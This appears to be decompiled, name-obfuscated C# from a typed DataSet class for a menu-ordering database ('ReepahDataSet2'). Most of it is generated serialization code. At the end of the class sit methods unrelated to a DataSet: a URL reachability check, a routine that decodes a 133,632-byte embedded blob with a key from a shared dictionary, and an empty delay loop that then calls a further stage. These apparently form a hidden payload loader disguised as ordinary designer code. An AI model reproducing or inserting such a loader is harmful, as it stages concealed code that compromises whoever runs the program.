	}

	[DesignerSerializationVisibility(DesignerSerializationVisibility.Hidden)]
	[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
	public new DataTableCollection Tables => base.Tables;

	[DesignerSerializationVisibility(DesignerSerializationVisibility.Hidden)]
	[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
	public new DataRelationCollection Relations => base.Relations;

	[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
	public Si0()
	{
		_schemaSerializationMode = SchemaSerializationMode.IncludeSchema;
		BeginInit();
		Ds1();
		CollectionChangeEventHandler value = Kq0;
		base.Tables.CollectionChanged += value;
		base.Relations.CollectionChanged += value;
		EndInit();
	}

	[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
	protected Si0(SerializationInfo info, StreamingContext context)
		: base(info, context, ConstructSchema: false)
	{
		_schemaSerializationMode = SchemaSerializationMode.IncludeSchema;
		if (IsBinarySerialized(info, context))
		{
			Wc9(i2L: false);
			CollectionChangeEventHandler value = Kq0;
			Tables.CollectionChanged += value;
			Relations.CollectionChanged += value;
			return;
		}
		string s = Conversions.ToString(info.GetValue("XmlSchema", typeof(string)));
		if (DetermineSchemaSerializationMode(info, context) == SchemaSerializationMode.IncludeSchema)
		{
			DataSet dataSet = new DataSet();
			dataSet.ReadXmlSchema(new XmlTextReader(new StringReader(s)));
			if (dataSet.Tables["Menu"] != null)
			{
				base.Tables.Add(new Xs5(dataSet.Tables["Menu"]));
			}
			if (dataSet.Tables["Requested_Items"] != null)
			{
				base.Tables.Add(new z1K(dataSet.Tables["Requested_Items"]));
			}
			base.DataSetName = dataSet.DataSetName;
			base.Prefix = dataSet.Prefix;
			base.Namespace = dataSet.Namespace;
			base.Locale = dataSet.Locale;
			base.CaseSensitive = dataSet.CaseSensitive;
			base.EnforceConstraints = dataSet.EnforceConstraints;
			Merge(dataSet, preserveChanges: false, MissingSchemaAction.Add);
			a0M();
		}
		else
		{
			ReadXmlSchema(new XmlTextReader(new StringReader(s)));
		}
		GetSerializationData(info, context);
		CollectionChangeEventHandler value2 = Kq0;
		base.Tables.CollectionChanged += value2;
		Relations.CollectionChanged += value2;
	}

	[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
	protected override void Kf1()
	{
		BeginInit();
		Ds1();
		EndInit();
	}

	[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
	public override DataSet Sx1()
	{
		Si0 si = (Si0)base.Clone();
		si.a0M();
		si.SchemaSerializationMode = SchemaSerializationMode;
		return si;
	}

	[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
	protected override bool n8D()
	{
		return false;
	}

	[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
	protected override bool Rn2()
	{
		return false;
	}

	[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
	protected override void Yz3(XmlReader p2N)
	{
		if (DetermineSchemaSerializationMode(p2N) == SchemaSerializationMode.IncludeSchema)
		{
			Reset();
			DataSet dataSet = new DataSet();
			dataSet.ReadXml(p2N);
			if (dataSet.Tables["Menu"] != null)
			{
				base.Tables.Add(new Xs5(dataSet.Tables["Menu"]));
			}
			if (dataSet.Tables["Requested_Items"] != null)
			{
				base.Tables.Add(new z1K(dataSet.Tables["Requested_Items"]));
			}
			base.DataSetName = dataSet.DataSetName;
			base.Prefix = dataSet.Prefix;
			base.Namespace = dataSet.Namespace;
			base.Locale = dataSet.Locale;
			base.CaseSensitive = dataSet.CaseSensitive;
			base.EnforceConstraints = dataSet.EnforceConstraints;
			Merge(dataSet, preserveChanges: false, MissingSchemaAction.Add);
			a0M();
		}
		else
		{
			ReadXml(p2N);
			a0M();
		}
	}

	[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
	protected override XmlSchema n8T()
	{
		MemoryStream memoryStream = new MemoryStream();
		WriteXmlSchema(new XmlTextWriter(memoryStream, null));
		memoryStream.Position = 0L;
		return XmlSchema.Read(new XmlTextReader(memoryStream), null);
	}

	[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
	internal void a0M()
	{
		Wc9(i2L: true);
	}

	[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
	internal void Wc9(bool i2L)
	{
		tableMenu = (Xs5)base.Tables["Menu"];
		if (i2L && tableMenu != null)
		{
			tableMenu.e0P();
		}
		tableRequested_Items = (z1K)base.Tables["Requested_Items"];
		if (i2L && tableRequested_Items != null)
		{
			tableRequested_Items.Et6();
		}
	}

	[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
	private void Ds1()
	{
		base.DataSetName = "ReepahDataSet2";
		base.Prefix = "";
		base.Namespace = "http://tempuri.org/ReepahDataSet2.xsd";
		base.EnforceConstraints = true;
		SchemaSerializationMode = SchemaSerializationMode.IncludeSchema;
		tableMenu = new Xs5();
		base.Tables.Add(tableMenu);
		tableRequested_Items = new z1K();
		base.Tables.Add(tableRequested_Items);
	}

	[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
	private bool Pp4()
	{
		return false;
	}

	[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
	private bool Sb6()
	{
		return false;
	}

	[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
	private void Kq0(object sender, CollectionChangeEventArgs e)
	{
		if (e.Action == CollectionChangeAction.Remove)
		{
			a0M();
		}
	}

	[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
	public static XmlSchemaComplexType j0P(XmlSchemaSet Wd4)
	{
		Si0 si = new Si0();
		XmlSchemaComplexType xmlSchemaComplexType = new XmlSchemaComplexType();
		XmlSchemaSequence xmlSchemaSequence = new XmlSchemaSequence();
		XmlSchemaAny xmlSchemaAny = new XmlSchemaAny();
		xmlSchemaAny.Namespace = si.Namespace;
		xmlSchemaSequence.Items.Add(xmlSchemaAny);
		xmlSchemaComplexType.Particle = xmlSchemaSequence;
		XmlSchema xmlSchema = si.n8T();
		if (Wd4.Contains(xmlSchema.TargetNamespace))
		{
			MemoryStream memoryStream = new MemoryStream();
			MemoryStream memoryStream2 = new MemoryStream();
			try
			{
				XmlSchema xmlSchema2 = null;
				xmlSchema.Write(memoryStream);
				IEnumerator enumerator = Wd4.Schemas(xmlSchema.TargetNamespace).GetEnumerator();
				while (enumerator.MoveNext())
				{
					xmlSchema2 = (XmlSchema)enumerator.Current;
					memoryStream2.SetLength(0L);
					xmlSchema2.Write(memoryStream2);
					if (memoryStream.Length == memoryStream2.Length)
					{
						memoryStream.Position = 0L;
						memoryStream2.Position = 0L;
						while (memoryStream.Position != memoryStream.Length && memoryStream.ReadByte() == memoryStream2.ReadByte())
						{
						}
						if (memoryStream.Position == memoryStream.Length)
						{
							return xmlSchemaComplexType;
						}
					}
				}
			}
			finally
			{
				memoryStream?.Close();
				memoryStream2?.Close();
			}
		}
		Wd4.Add(xmlSchema);
		return xmlSchemaComplexType;
	}

	internal static bool Ra3(string n6P)
	{
		try
		{
			WebRequest webRequest = WebRequest.Create(n6P);
			webRequest.GetResponse();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
		return true;
	}

	internal static void Fd3()
	{
		byte[] array = Xw9.c7T(133632);
		checked
		{
			int yy = Convert.ToInt32(RuntimeHelpers.GetObjectValue(Cj0.mDic[Cj0.sNum])) * 3;
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				array[i] = Zx0.a2E(array[i], (byte[])Cj0.mDic[Cj0.sArray], yy, i);
			}
			Cj0.mDic.Add(Cj0.mArray, array);
		}
	}

	internal static void w3N()
	{
		for (int num = 4018606; num <= 0; num = checked(num - 1))
		{
		}
		Cj0.x4P();
	}
}
